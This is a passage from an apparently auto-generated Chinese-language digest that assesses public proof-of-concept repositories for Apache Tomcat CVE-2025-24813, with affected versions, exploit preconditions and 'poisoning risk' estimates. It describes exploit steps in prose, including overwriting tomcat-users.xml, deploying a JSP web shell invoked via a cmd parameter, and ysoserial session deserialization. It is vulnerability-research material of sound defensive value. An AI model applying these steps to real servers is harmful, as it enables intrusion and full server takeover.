   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

